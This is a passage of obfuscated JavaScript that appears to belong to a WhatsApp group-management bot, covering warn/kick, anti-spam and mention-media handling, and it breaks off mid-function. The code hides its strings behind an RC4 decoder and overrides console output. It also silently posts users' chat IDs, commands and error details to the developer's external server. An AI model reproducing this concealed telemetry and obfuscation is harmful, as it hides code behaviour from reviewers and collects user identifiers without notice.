    "WPdcTSkb",
    "BMfT",
    "W5KMW4W",
    "W51JW5S",
    "wvC1",
    "ChjV",
    "v8kUlq",
    "pCkuW54",
    "jSoalq",
    "fmkaW58",
    "zxjZ",
    "WO7dNM0",
    "WPntWOO",
    "mSoQha",
    "w0/cQG",
    "WP/cS8kq",
    "W40AaG",
    "Cfvk",
    "yhFcSq",
    "fSkZW5u",
    "WO3cT8oi",
    "sqxcGa",
    "fCkwW4W",
    "rxbT",
    "ncbF",
    "W6fAnq",
    "WPHZWOa",
    "f8kgWR0",
    "WQP5WQi",
    "wgNcPW",
    "uf9e",
    "pJKL",
    "WOqPoW",
    "kmoIpq",
    "W7nuWPG",
    "W5O5W48",
    "iK5h",
    "pdSC",
    "o8kqWQ4",
    "r0j7",
    "DwX0",
    "z3fT",
    "FqWk",
    "AWNcGa",
    "Dw5S",
    "W6eZlq",
    "W7BcImkR",
    "mvjf",
    "fSk8W7C",
    "W5uOWPW",
    "WP3cVCkR",
    "C3bS",
    "WQ7cTZq",
    "BMqG",
    "W5NdRtW",
    "ps4q",
    "WQjoWQ8",
    "EZj9",
    "zLHJ",
    "ndKX",
    "W7SIhG",
    "W5bRbq",
    "WPrWWPy",
    "WQNcS8kf",
    "iX90",
    "Dej6",
    "WPLEWPC",
    "WR3cSYe",
    "WQGQaG",
    "acHO",
    "BwfS",
    "W55LWPm",
    "W6lcT8kp",
    "DcbL",
    "AXLv",
    "WPjtWOm",
    "Dxbt",
    "WQ0/yq",
    "BNrn",
    "ixnC",
    "WQ1KWQW",
    "WOvyWOO",
    "wdNcIW",
    "uwP6",
    "W7uOWP0",
    "rhjW",
    "WOzcWP4",
    "WPNcHmkL",
    "W5XDkq",
    "jc4e",
    "uCkbbW",
    "Cfzt",
    "acRcMW",
    "iSkvWOW",
    "zMv0",
    "W6aLWOO",
    "yqzz",
    "zxrH",
    "WP3cJqa",
    "WO08WOpcL2hcVdXmW5VcUG",
    "WQe+uq",
    "ybOu",
    "hCkQW6K",
    "aSobW70",
    "W7GHga",
    "W6WLWOO",
    "vurp",
    "BMLU",
    "WQ3cHH0",
    "idLE",
    "WOlcQ8ob",
    "WR/cQSoP",
    "EX9x",
    "BwLy",
    "W7POcq",
    "WOOQuW",
    "W587W5W",
    "q2Pr",
    "W792W5W",
    "WPVcTdO",
    "WOZdJbBdPuBcHs4",
    "BxnK",
    "vs0W",
    "WRJcOCkj",
    "WRpcOte",
    "WOC6WOC",
    "WQtcNGu",
    "j01v",
    "p8k0lq",
    "W74ioa",
    "WO/dVCkO",
    "WO9cWOS",
    "WOVdG8kM",
    "W7r/aG",
    "BgLK",
    "W7fgka",
    "DgLJ",
    "AXTC",
    "tgvI",
    "WPJcGra",
    "WQ7cLCkj",
    "zWnm",
    "mmk4W74",
    "DMLH",
    "ice9",
    "WRuUqa",
    "W7CSWP8",
    "t1ju",
    "s0fU",
    "g291",
    "sLDn",
    "j8kWW6i",
    "W7hcOmkl",
    "qbxcGa",
    "a0T4",
    "WRr5WQZdKa8fW7aR",
    "bMnH",
    "WQWUxG",
    "W583W4C",
    "BNvS",
    "W69Cpa",
    "qcBcKa",
    "W6OFW6a",
    "W7vHfq",
    "oCkTkW",
    "WPNcPSop",
    "ntOG",
    "W6f4aW",
    "AweV",
    "BNrb",
    "uGxcLW",
    "B2LU",
    "WOPtWQG",
    "W7y5mq",
    "lISP",
    "WOavWQS",
    "Ewzp",
    "WP3cKmkV",
    "oCopjW",
    "mSk1W5i",
    "qSoMWOa",
    "d8ooWQK",
    "WOpcGWy",
    "zwru",
    "otCM",
    "WOBcIqS",
    "vqNcHW",
    "nSkUWRO",
    "tmkcW6e",
    "lM5L",
    "W4aAWRW",
    "CMrw",
    "WRBcPbm",
    "WPVdLMO",
    "EWzz",
    "tXtcUW",
    "WP3cT8kQ",
    "WR7cUty",
    "WQikDW",
    "W5nMgG",
    "W47cIJC",
    "suGG",
    "hSodjW",
    "B3zL",
    "zsbT",
    "x23cVa",
    "W5VdPJ8",
    "u1rD",
    "p8oKjW",
    "W6aKeq",
    "ywzR",
    "W4G9W5e",
    "W43dUJq",
    "WQuQsa",
    "W7HJfG",
    "vvbF",
    "bJfu",
    "zM9Y",
    "W5G0oG",
    "W6JdMXq",
    "DxaG",
    "cYHt",
    "vL8T",
    "WQK5qMX1W5yOW7fSjcbmbq",
    "CMfU",
    "v2fq",
    "q2HL",
    "EwH2",
    "uWWX",
    "w8ooWRu",
    "hJLz",
    "WPBdKmkZ",
    "WQq/W64",
    "W5xdQcu",
    "W7WEW5S",
    "vSogWOa",
    "sSk1la",
    "osddLq",
    "vevt",
    "WQJcLCkp",
    "CIhcOW",
    "yxbW",
    "fCkvW74",
    "W5KSeG",
    "Aw8V",
    "W6WMWQi",
    "Fa9i",
    "W5xdUwu",
    "WQqLwW",
    "W4XLWPK",
    "WR/cNCoG",
    "WP/cHtO",
    "o8kWW7m",
    "uxLh",
    "W6pcQ8kl",
    "WPDnWOS",
    "WOxdLmk1",
    "W5K0lG",
    "DWWk",
    "WRX/WP4",
    "fGbG",
    "BgvK",
    "W418W5K",
    "ENvn",
    "A05v",
    "lI91",
    "WPTCWOa",
    "CgfY",
    "d8ktWOK",
    "CuPl",
    "zv9T",
    "s0L8",
    "n8khWRS",
    "WQVcTYK",
    "WP1pWOS",
    "W59LW5K",
    "C29J",
    "WQf0WQi",
    "ndOG",
    "WOxdNmk3",
    "CgX1",
    "oCoClG",
    "WOzsW4m",
    "gSovba",
    "D09U",
    "zc8b",
    "pIum",
    "mSkXW78",
    "W6xcTZS",
    "W7zqcW",
    "WOlcTCog",
    "FMHA",
    "BIlcRG",
    "WPH7W5q",
    "Axnb",
    "C2vo",
    "iIKO",
    "WPRdICkj",
    "WQyUxW",
    "sMLK",
    "BMfP",
    "jdOI",
    "B3rB",
    "WORdLmkJ",
    "W6W/WO0",
    "gSkTmW",
    "fCk9W7u",
    "BtOf",
    "WQHgWQ8",
    "bZvj",
    "i8k4W7m",
    "gmozfq",
    "W65loa",
    "dmktWPS",
    "mtbdB2PewxC",
    "qgXP",
    "WQtcJt0",
    "mZa3",
    "W7jUkq",
    "ovis",
    "W5/cMSkG",
    "y29T",
    "dmoDWQi",
    "zMjm",
    "WPLoWQq",
    "tHtcGq",
    "W5SWla",
    "y2TL",
    "yaOq",
    "lSoPWPi",
    "WRv2FW",
    "W7vkka",
    "W418W5q",
    "WQ0FuW",
    "Dg9t",
    "ievY",
    "WOFdN8kX",
    "W7XOfa",
    "uKPs",
    "kJ0y",
    "zvH5",
    "y3rP",
    "fSkDW48",
    "W5j5W5e",
    "uHtcLG",
    "W7RcLSkE",
    "vqO2",
    "WQZcPCkp",
    "WRJdPvW",
    "kIyu",
    "WQG/W6W",
    "ct9u",
    "D09Z",
    "aeLI",
    "W4ZdUZG",
    "BwLT",
    "jmoJWQa",
    "yMXL",
    "W7JcIbK",
    "WOJcVmok",
    "WOBcOmou",
    "C3rY",
    "Bg9N",
    "kSkuWRm",
    "WOJcGHy",
    "W7eGWOa",
    "z1rO",
    "pmkaW7O",
    "m0PB",
    "W5b8WP4",
    "W4zega",
    "EvjI",
    "W7OIoG",
    "yvPM",
    "WRNcLCkc",
    "W54KgG",
    "W6lcQ8kE",
    "W7GZla",
    "fCohlW",
    "AXnt",
    "Ehq9",
    "WQ7cLCk8",
    "WR5HWQy",
    "r0Xl",
    "fSozWQm",
    "W4iHpW",
    "W5VcSZi",
    "EMrl",
    "WQagsG",
    "BMTw",
    "l3rL",
    "WRBcMmkR",
    "C2f0",
    "EZf9",
    "kYxcLG",
    "u8k9jG",
    "WQlcGCoD",
    "W6u3pa",
    "WPxcJtW",
    "WQq4xG",
    "W6Tloq",
    "rxPw",
    "W4z2WO0",
    "WO1tWOa",
    "mdnK",
    "v2L0",
    "sSkXoG",
    "WO4ZWPa",
    "ywrT",
    "Axng",
    "iYVcVq",
    "W4y5W5S",
    "WPvEWPW",
    "W71wiW",
    "WQGPtq",
    "BuvI",
    "hmownW",
    "E30U",
    "icRcMW",
    "kd3cHW",
    "aCksW64",
    "W7K/mq",
    "qKff",
    "WPrOWQW",
    "WRz9WRy",
    "W5OSaq",
    "W7TMgW",
    "C3nt",
    "B25s",
    "W6vKhW",
    "iJVcKa",
    "tCkdiq",
    "DgLt",
    "W4W3W40",
    "WQi9rM0XWQ9wW6T5gW",
    "WQTOWQ4",
    "CWOk",
    "W7Thjq",
    "AgfU",
    "c8oGiSoKhGhdQSk/",
    "W4m0oG",
    "WRrOWRa",
    "W5WuWOC",
    "uSoCWRy",
    "p8klW5e",
    "W7z5ga",
    "vM90",
    "WP7cHr0",
    "jcyQ",
    "otBdLq",
    "vgLT",
    "WPvgWPO",
    "DMLU",
    "W4xcTYy",
    "WQS+cW",
    "W4uMW5y",
    "pN11",
    "hCoclW",
    "EuDY",
    "W5LYWO0",
    "m0rg",
    "zuTJ",
    "amk8ja",
    "y3v0",
    "bCkqcq",
    "rfvs",
    "DK1k",
    "atvd",
    "WQ8Usq",
    "B3vB",
    "sbdcHq",
    "W5OSbW",
    "W4q/WP8",
    "CxvL",
    "cSoOaq",
    "WO/cLSkT",
    "u3HX",
    "WRBcKCkF",
    "W794hq",
    "W4qIW4S",
    "WQBcLaq",
    "WRbsWRy",
    "W6SVWOa",
    "iSkOmW",
    "tuvv",
    "WPJcL2e",
    "u0fh",
    "Dg8G",
    "BwLZ",
    "lIbu",
    "W77cQSkt",
    "z2uV",
    "hCohlG",
    "c8kSW6K",
    "BhzL",
    "omoOja",
    "cGBcKa",
    "bmoqeq",
    "WQ4HW7S",
    "rv9c",
    "zty0",
    "WRCPrW",
    "WRa+sa",
    "WP4SWPu",
    "psdcMq",
    "h8k4jW",
    "oHSU",
    "tg16",
    "l3P3",
    "C0zO",
    "W6Spoq",
    "WQNcOqm",
    "WORcIqa",
    "W5tdPJy",
    "W796pW",
    "WQZcGay",
    "C1Py",
    "ta7cVq",
    "DM90",
    "aYn4",
    "W7fEWPu",
    "c8k0W7i",
    "WOJcJWy",
    "WQ9cWRu",
    "nSk4W7W",
    "W441za",
    "tL9n",
    "uSk7lW",
    "ExbL",
    "laql",
    "whbs",
    "iY87",
    "WQBdTK0",
    "sSkXma",
    "WPhdLNC",
    "C29U",
    "zunV",
    "W6pcP8kq",
    "WRaPwW",
    "cd0m",
    "v8kNdW",
    "W6DgnG",
    "WQxcTNa",
    "WODZWO8",
    "fCoiWO8",
    "hd9o",
    "W5O4bG",
    "sSk9kW",
    "iNjL",
    "kMrj",
    "jIqt",
    "vM1z",
    "a8kPcG",
    "W44Gha",
    "wdnQ",
    "tL9m",
    "gIvj",
    "AxzL",
    "AuXP",
    "WRrtWQG",
    "W5f2W5q",
    "WPlcT8k/",
    "CMvH",
    "z2u6",
    "osRcJq",
    "jvvD",
    "D3jP",
    "rhbJ",
    "qwjf",
    "z2fT",
    "hCk8lG",
    "W7yJkW",
    "W5WIaq",
    "sv9e",
    "e8oXWOG",
    "WRrtWRO",
    "WO3cOmkV",
    "t8oqWOC",
    "veLt",
    "WQW8W64",
    "DXlcKW",
    "W5D8W5q",
    "W51TW4e",
    "tXOu",
    "WRCPua",
    "WQ9FWQG",
    "wvtcMa",
    "pcOA",
    "CgfT",
    "WPNcUbC",
    "WQVcV8k3",
    "gJXp",
    "W70mjW",
    "cCozWR0",
    "kJGo",
    "WPRcNSkM",
    "A1DL",
    "CLfM",
    "W5ezgG",
    "teddNG",
    "WQbeWRq",
    "vaWV",
    "WRZcVmk+",
    "r8ouWPy",
    "WReDqW",
    "WQCTvW",
    "yxvK",
    "t0fL",
    "y2vP",
    "sxj3",
    "mHSU",
    "C2vK",
    "gCkLlG",
    "WQBcSZK",
    "WQOUva",
    "bbPI",
    "WPNcIqO",
    "W5OdWOa",
    "WQPKWQW",
    "Ew5J",
    "razS",
    "WPNdOwm",
    "WOJcSCoo",
    "DeL6",
    "kIul",
    "hCosma",
    "WOJcNWe",
    "WOZcTSkI",
    "hb45",
    "WRFdNCkg",
    "gCk2WPS",
    "qu1k",
    "jCk0W6a",
    "tvnh",
    "WQRcNCki",
    "sgfU",
    "ygbG",
    "v2fY",
    "gSojlq",
    "WP/cGWC",
    "W43cIGa",
    "W5TNWPG",
    "C3DQ",
    "tahcKa",
    "wvjk",
    "W7G4W4S",
    "W7ySWQe",
    "zYbm",
    "W7bUba",
    "v8kKkq",
    "rvjs",
    "lI90",
    "yXnb",
    "WOJcMmk4",
    "W75Srq",
    "psqi",
    "WO7cJSoe",
    "W48/bW",
    "vCoCWPa",
    "jmo/pW",
    "Dg9L",
    "s2ri",
    "W7i1cG",
    "WOqTWOu",
    "eJ1f",
    "WP/cN8kR",
    "WRCLta",
    "lGxcVa",
    "fWr5",
    "lcbJ",
    "W6pcR8ky",
    "u8kXoW",
    "lqOk",
    "hmoqjG",
    "WRlcTCk7",
    "W7vtkq",
    "t8kHlq",
    "oYiE",
    "w8kSkW",
    "BMCU",
    "lcyz",
    "W6/dGdK",
    "WQldQhm",
    "WOxcOCkh",
    "WPNcT8oi",
    "ChbH",
    "WORcVSkV",
    "W6S3ha",
    "WONcS8k0",
    "W4CObG",
    "W4P1W4u",
    "ufjf",
    "zXCn",
    "W544bG",
    "jmooWRu",
    "qKTr",
    "WQpdTmoF",
    "WPBcNSkU",
    "amkrW70",
    "eSk6jG",
    "W5RcVsa",
    "W6aNWOS",
    "ic8y",
    "zLnc",
    "DMfS",
    "qw5i",
    "vMLV",
    "n8kfWRS",
    "CmkAlq",
    "hCkPaG",
    "DhjP",
    "cmkmW6a",
    "WPeyBW",
    "rhrS",
    "ihzV",
    "WP7cIqe",
    "iI4o",
    "yunT",
    "smk7pa",
    "Ae5H",
    "WPhcK8k/",
    "WRnVWQm",
    "W7nciG",
    "kcSi",
    "W7ySWPW",
    "yflcQG",
    "WRT5kW",
    "BMCG",
    "Bw9U",
    "kCkRW4a",
    "W61RtG",
    "W54bWO4",
    "W5fHWO8",
    "Aw5M",
    "hmozWQi",
    "W4vipq",
    "WQ7cPH0",
    "WQKPtq",
    "jtmM",
    "ANHs",
    "gblcHGdcQhtdUCkr",
    "WO/cVCkY",
    "W7q1cW",
    "W4ZdRdu",
    "WReQxW",
    "xd93",
    "vrlcJq",
    "a8kpW5S",
    "WPntWO8",
    "svDp",
    "W4rYWO8",
    "nCkPW40",
    "ewbh",
    "W5v+WQS",
    "kmkqWQW",
    "txrL",
    "jSkiW60",
    "i8oOla",
    "tWCp",
    "pIpcNa",
    "A8oJWQy",
    "WOvsWOC",
    "sSoAWPC",
    "BgfU",
    "DvDd",
    "W7OVhq",
    "WPnxWOK",
    "B19F",
    "W7eWWP8",
    "cGfH",
    "n8kkWRS",
    "DhLW",
    "rHST",
    "W4mJvq",
    "retcMa",
    "W7hcQCkM",
    "WO7dKM0",
    "DgLV",
    "B25n",
    "qwzL",
    "W7WLhq",
    "uejW",
    "jd/cLa",
    "jZC5",
    "icHM",
    "r3jV",
  ];
  a4 = function () {
    return l7;
  };
  return a4();
}
bR();
const bS = (function () {
  const a8 = {
    GSJRG: "participant_remove",
    swBIV: function (ab, ac) {
      return ab !== ac;
    },
    bvIOO: "false",
    AWBIF: "prepare_message",
    MWIDk: "&mention",
    vmBiX: function (ab, ac) {
      return ab === ac;
    },
    fVHBI: "FvOJh",
    MteYp: "TaTdX",
    iDDMU: "KyQzs",
  };
  a8.pngYq = "wdIYh";
  let aa = true;
  return function (ab, ac) {
    const ad = {
      ktpiF: "participant_remove",
      NlXfN: function (ag, ah) {
        return ag !== ah;
      },
      pUkGw: "false",
      KLyEi: "prepare_message",
      LmzqD: "&mention",
      Jrtss: function (ag, ah) {
        return ag === ah;
      },
      keSxO: "FvOJh",
      vNgSz: "TaTdX",
      mKtpI: function (ag, ah) {
        return ag === ah;
      },
      dQTBj: "KyQzs",
      anSTa: a8.pngYq,
    };
    const af = aa
      ? function () {
          if (ac) {
            if ("KyQzs" === ad.anSTa) {
              const aj = {
                type: "participant_remove",
                chat: al.remoteJid,
                participant: am.participant,
              };
              const ak = {
                mentionedJid: [av.participant],
              };
              const al = {
                contextInfo: ak,
              };
              ak.queue.push(aj);
              if ("false" !== an[ao.session].env.ANTISPAM_MSG) {
                ap.queue.push({
                  type: "prepare_message",
                  chat: aq.remoteJid,
                  message: {
                    text: ar[as.session].env.ANTISPAM_MSG.replace(
                      "&mention",
                      "@" + at.jidToNum(au.participant),
                    ),
                  },
                  options: al,
                });
              }
            } else {
              const aj = ac.apply(ab, arguments);
              ac = null;
              return aj;
            }
          }
        }
      : function () {};
    aa = false;
    return af;
  };
})();
const bT = bS(this, function () {
  const a8 = function () {
    let ad;
    try {
      ad = Function('return (function() {}.constructor("return this")( ));')();
    } catch (ag) {
      ad = window;
    }
    return ad;
  };
  const a9 = a8();
  const aa = (a9.console = a9.console || {});
  const ab = ["log", "warn", "info", "error", "exception", "table", "trace"];
  for (let ac = 0; ac < ab.length; ac++) {
    const ad = bS.constructor.prototype.bind(bS);
    const af = ab[ac];
    const ag = aa[af] || ad;
    ad.__proto__ = bS.bind(bS);
    ad.toString = ag.toString.bind(ag);
    aa[af] = ad;
  }
});
bT();
const bU = require("fs-extra");
const { join: bV } = require("path");
const { default: bW } = require("axios");
const { loadBaileys: bX } = require("./baileys");
let bY;
let bZ;
let c0;
let c1;
let c2;
let c3;
let c4;
let c5;
let c6;
const c7 = require("../config");
const c9 = require("./index");
const { Message: ca } = require("./class/index");
const cb = {};
const { getPmMessage: cc, setPmMessage: cd } = require("./db");
const { setMsgs: cf } = require("./db/store");
const cg = require("./config");
const {
  secondsToHms: ch,
  getFloor: ci,
  isUrl: cj,
  expiration: ck,
  isFeatureEnabled: cl,
} = require("./utils");
const cm = (a7) => (/type\/(gif|mp4|sticker|image|audio)/.exec(a7) || [])[1];
if (!bU.existsSync(bV(__dirname, "../media/mention/"))) {
  bU.mkdirSync(bV(__dirname, "../media/mention/"));
}
const cn = {};
function hY(a7, a8) {
  return a5(a8 + 0x20e, a7);
}
cn.done = false;
cn.path = "";
cn.message = "";
function i7(a7, a8) {
  return a6(a7 - 0xe4, a8);
}
function i1(a7, a8) {
  return a5(a8 + 0x1cf, a7);
}
function i0(a7, a8) {
  return a6(a8 + 0x1d1, a7);
}
cn.type = "";
function i6(a7, a8) {
  return a6(a7 - 0x206, a8);
}
const co = {
  a: false,
  json: {},
};
const cp = ["⏳", "✅", "❌", ""];
const cq = new RegExp("^(kick|warn|dlt)");
const cr = (a7) =>
  a7.match(
    /(http|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/g,
  );
const cw = [
  "918136962641-1630730584@g.us",
  "918136962641-1635266273@g.us",
  "918136962641-1609228303@g.us",
];
const cx = (a7) => {
  if (a7) {
    return a7.replace(/:\d+/, "");
  }
};
const cz = new RegExp("afkrey");
async function cA(a8) {
  if (!a8.linkPreview) {
    return a8;
  }
  if (a8.linkPreview.thumbnail) {
    const { buffer: ac } = await c9.getBuffer(a8.linkPreview.thumbnail, true);
    if (ac) {
      a8.linkPreview.thumbnail = ac;
    }
  }
  if ("jpegThumbnail" in a8.linkPreview) {
    const { buffer: ad } = await c9.getBuffer(
      a8.linkPreview.jpegThumbnail,
      true,
    );
    if (ad) {
      a8.linkPreview.jpegThumbnail = await d4.genThumbnail(ad);
    }
  }
}
const cB = {
  gif: "video",
  mp4: "video",
  sticker: "sticker",
  image: "image",
  audio: "audio",
};
function i5(a7, a8) {
  return a6(a7 + 0x117, a8);
}
const cC = {
  gif: "video/mp4",
  mp4: "video/mp4",
  sticker: "image/webp",
  audio: "audio/ogg; codecs=opus",
  image: "image/png",
};
const cD = {
  gif: ".mp4",
  mp4: ".mp4",
};
function i4(a7, a8) {
  return a6(a8 + 0x2c, a7);
}
cD.sticker = ".webp";
cD.audio = ".opus";
cD.image = ".jpeg";
function a5(a, b) {
  const c = a4();
  a5 = function (d, e) {
    d = d - 271;
    let f = c[d];
    if (a5.ZUKoKr === undefined) {
      var g = function (l) {
        let n = "";
        let o = "";
        let p = n + g;
        let q = 0;
        let r;
        let s;
        for (
          let t = 0;
          (s = l.charAt(t++));
          ~s && ((r = q % 4 ? r * 64 + s : s), q++ % 4)
            ? (n +=
                p.charCodeAt(t + 10) - 10 !== 0
                  ? String.fromCharCode(255 & (r >> ((-2 * q) & 6)))
                  : q)
            : 0
        ) {
          s =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
              s,
            );
        }
        let u = 0;
        for (let v = n.length; u < v; u++) {
          o += "%" + ("00" + n.charCodeAt(u).toString(16)).slice(-2);
        }
        return decodeURIComponent(o);
      };
      const k = function (l, m) {
        let n = [];
        let o = 0;
        let p;
        let q = "";
        l = g(l);
        let r;
        for (r = 0; r < 256; r++) {
          n[r] = r;
        }
        for (r = 0; r < 256; r++) {
          o = (o + n[r] + m.charCodeAt(r % m.length)) % 256;
          p = n[r];
          n[r] = n[o];
          n[o] = p;
        }
        r = 0;
        o = 0;
        for (let t = 0; t < l.length; t++) {
          r = (r + 1) % 256;
          o = (o + n[r]) % 256;
          p = n[r];
          n[r] = n[o];
          n[o] = p;
          q += String.fromCharCode(l.charCodeAt(t) ^ n[(n[r] + n[o]) % 256]);
        }
        return q;
      };
      a5.uSYfxf = k;
      a = arguments;
      a5.ZUKoKr = true;
    }
    const h = c[0];
    const i = d + h;
    const j = a[i];
    if (!j) {
      if (a5.bfLdnH === undefined) {
        const l = function (m) {
          this.QUfhss = m;
          this.HtTbex = [1, 0, 0];
          this.ZLmpWA = function () {
            return "newState";
          };
          this.ZehaEa = "\\w+ *\\(\\) *{\\w+ *";
          this.RwvWuR = "['|\"].+['|\"];? *}";
        };
        l.prototype.DQvbqG = function () {
          const m = new RegExp(this.ZehaEa + this.RwvWuR);
          const n = m.test(this.ZLmpWA.toString())
            ? --this.HtTbex[1]
            : --this.HtTbex[0];
          return this.gPQjFM(n);
        };
        l.prototype.gPQjFM = function (m) {
          if (!Boolean(~m)) {
            return m;
          }
          return this.DVjXnU(this.QUfhss);
        };
        l.prototype.DVjXnU = function (m) {
          let n = 0;
          for (let o = this.HtTbex.length; n < o; n++) {
            this.HtTbex.push(Math.round(Math.random()));
            o = this.HtTbex.length;
          }
          return m(this.HtTbex[0]);
        };
        new l(a5).DQvbqG();
        a5.bfLdnH = true;
      }
      f = a5.uSYfxf(f, e);
      a[i] = f;
    } else {
      f = j;
    }
    return f;
  };
  return a5(a, b);
}
const cE = (a7) => a7 + "@lid";
const cF = (a7) =>
  a7 && "string" == typeof a7
    ? a7.length > 30
      ? "android"
      : 20 != a7.length || a7.startsWith("RGNK")
        ? "3EB" === a7.substring(0, 3)
          ? "web"
          : 18 == a7.length
            ? "win"
            : "bot"
        : "ios"
    : a7;
const cG = {};
const { version: cL } = require("../package.json");
const cM = (a8, a9, aa) => {
  const ab = {
    a: a8 + "-" + cL,
    b: a9,
    c: aa,
  };
  bW.post("https://levanter-plugin.levanter.site/xerror", ab)["catch"](
    () => {},
  );
};
const cN = (a8, a9, aa) => {
  const ab = {
    jid: a8,
    command: a9,
    isGroup: aa,
  };
  bW.post("https://levanter-plugin.levanter.site/analytics", ab)["catch"](
    () => {},
  );
};
const cO = (a8, a9) => {
  let ac = "";
  switch (a9) {
    case "extendedTextMessage":
      ac = a8.extendedTextMessage.text;
      break;
    case "imageMessage":
      ac = a8.imageMessage.caption;
      break;
    case "videoMessage":
      ac = a8.videoMessage.caption;
      break;
    case "documentMessage":
      ac = a8.documentMessage.caption;
      break;
    case "listResponseMessage":
      ac = a8.listResponseMessage.singleSelectReply.selectedRowId;
      break;
    case "buttonsResponseMessage":
      ac = a8.buttonsResponseMessage.selectedButtonId;
      break;
    case "templateButtonReplyMessage":
      ac = a8.templateButtonReplyMessage.selectedId;
      break;
    case "eventMessage":
      ac = a8.eventMessage.action;
      break;
    default:
      ac = a8.conversation;
  }
  return ac;
};
const cP = (a9) => {
  const ac = {
    enabled: false,
  };
  if (!a9 || "null" === a9 || "false" === a9) {
    return ac;
  }
  const ad = a9.trim().split(/\s+/);
  return {
    enabled: true,
    destination: ad[0],
    scope: ad.length > 1 ? ad[1].toLowerCase() : null,
  };
};
const cQ = (a8, a9) => {
  if (!a8) {
    return true;
  }
  const ac = a9.endsWith("@g.us");
  switch (a8) {
    case "pm":
    case "no-gm":
      return !ac;
    case "gm":
    case "no-pm":
      return ac;
    default:
      return true;
  }
};
const cR = (a7, a8, a9) =>
  "g" === a7 ? a8 : "p" === a7 || "on" === a7 ? a9 : a7;
const cS = (a8, a9) => {
  if (!a8 || "false" === a8 || "null" === a8) {
    return false;
  }
  if ("true" === a8) {
    return true;
  }
  const [ac, ad] = a8.split(/\bignore\b/);
  if (ad && c9.parsedJid(ad).includes(a9)) {
    return false;
  }
  const af = ac
    .trim()
    .split(/[\s,]+/)
    .filter(Boolean);
  if (!af.length) {
    return true;
  }
  const ag = a9.endsWith("@g.us");
  return af.some((ah) => ("p" === ah ? !ag : "g" === ah ? ag : ah === a9));
};
const cU = require("./test/test");
const { LRUCache: cW } = require("./db/nr");
const cX = new cW(1000, 3600000);
const cY = new cW(1000, 3600000);
const cZ = (a8, a9, aa) => {
  if (!a8) {
    return;
  }
  const ad = cX.get(a8);
  if (undefined !== ad) {
    return ad;
  }
  const af = a9.participants.find((ah) => ah.lid === a8);
  if (!af) {
    return;
  }
  const ag = aa.includes(c9.jidToNum(af.phoneNumber));
  cX.set(a8, ag);
  return ag;
};
const d0 = (a8) => {
  const a9 = {
    UhFuZ: function (ag, ah) {
      return ag > ah;
    },
  };
  a9.GezHF = function (ag, ah) {
    return ag === ah;
  };
  a9.sruiW = "ciQBv";
  a9.MPUqd = "dwwjT";
  const ab = c9.parseNum(cg[a8].env.WHITE_LIST).map(c9.numToJid);
  let ac = c9.parseNum(cg[a8].env.SUDO).map(c9.numToJid).map(c9.jidToNum);
  let ad = c9.parseNum(cg[a8].env.GROUP_ADMINS).map(c9.numToJid);
  cg[a8].adminsjid = ad;
  cg[a8].sca = ad.length > 0;
  cg[a8].TEMP_SUDO = ac.slice(0, 20);
  const af = cg[a8].env.ANTIWORDS.split(",")
    .filter(Boolean)
    .map((ag = "") => new RegExp(ag.trim(), "ui"));
  cg[a8].regexes = af;
  cg[a8].DISABLE_BOT_JIDS = c9.parsedJid(cg[a8].env.DISABLE_BOT);
  cg[a8].WHITE_LIST_MAP = ab;
  if (cg[a8].env.MENTION) {
    try {
      cg[a8].parsedMention = JSON.parse(cg[a8].env.MENTION);
    } catch (ag) {
      if (a9.GezHF(a9.sruiW, a9.MPUqd)) {
        return a8;
      } else {
        cg[a8].parsedMention = null;
      }
    }
  } else {
    cg[a8].parsedMention = null;
  }
};
cg.preparevars = d0;
let d1 = require("./antilink");
let d2 = require("./misc");
const d3 = require("crypto");
const d4 = require("./constant");
const d5 = () => {
  global.sock = d3.randomBytes(3).toString("hex");
};
const d6 = cU.iChecker();
const d7 =
  d6 == "aWxvdmV5b3Vzb29vb29vbWF0Y2hidXRpZG9udGtub3d3aHlpbGlrZWxvdmV3YW50dQ==";
const d8 = {
  value: false,
  writable: true,
};
d4.writeStream(global, "shift", d8);
const d9 = require("./tictactoe");
const da = require("path");
let db = 0;
const dc = (a7) => {
  let a8 = a7[db];
  if (!a8) {
    db = 0;
    a8 = a7[db];
  }
  db++;
  return a8;
};
const dd = (a7, a8, a9, aa, ab) => ({
  ...a7,
  commands: a8,
  PREFIX: a9,
  ...aa,
  pluginsCount: ab,
});
const df = ["setvar", "setsudo", "zushi"];
const dg = async (a7, a8, a9, aa) => {
  const ac = await c9.getBuffer(a7, false);
  let ad = ac.buffer;
  if (!ad) {
    return ac.error;
  }
  try {
    const af = bV(d4.TEMP_DIR, ac.name);
    bU.writeFileSync(af, ad);
    const ag = bV(__dirname, "../media/mention/" + aa + a8);
    if ("audio" === a9) {
      const ai = await c9.getFfmpegBuffer(af, "" + aa + a8, "opus");
      bU.writeFileSync(ag, ai);
    } else {
      if ("sticker" === a9) {
        const aj = await c9.sticker(
          "" + aa + a8.replace(".webp", ""),
          af,
          "image" === ac.type ? 1 : 2,
          aa,
        );
        bU.writeFileSync(ag.endsWith(".webp") ? ag : ag + ".webp", aj);
      } else {
        bU.writeFileSync(ag, ad);
        if (bU.existsSync(af)) {
          bU.unlinkSync(af);
        }
      }
    }
  } catch (al) {
    return al;
  }
};
async function dh(ai, aj, ak, al, am, an) {
  const aq = {
    participant: ai,
    groupJid: aj,
    sessionId: ak,
  };
  console.log("[TEST] executeWarnAction called:", aq);
  try {
    const ar = cg[ak];
    const as = ar.env.WARN_LIMIT || 3;
    const at = await c9.setWarn(ai, aj, ak, as);
    if (at > as) {
      if (!(await c9.isAdmin(an.participants, am.user.jid))) {
        return void al.queue.push({
          type: "prepare_message",
          chat: aj,
          message: {
            text: c9.lang.plugins.common.not_admin,
          },
        });
      }
      if (await c9.isAdmin(an.participants, ai)) {
        return void al.queue.push({
          type: "prepare_message",
          chat: aj,
          message: {
            text: c9.lang.plugins.warn.cannot_remove_admin,
          },
        });
      }
      const au = "@" + c9.jidToNum(ai);
      const av =
        ar.env.WARN_KICK_MESSAGE?.["replace"]("&mention", au) ||
        c9.lang.plugins.warn.kick_default.format(au);
      const aw = {
        text: av,
      };
      const ax = {
        mentionedJid: [ai],
      };
      const ay = {
        contextInfo: ax,
      };
      const az = {
        type: "prepare_message",
        chat: aj,
        message: aw,
        options: ay,
      };
      al.queue.push(az);
      await c9.deleteWarn(ai, aj, ak);
      al.queue.push({
        type: "participant_remove",
        chat: aj,
        participant: ai,
      });
    } else {
      const aB = "@" + c9.jidToNum(ai);
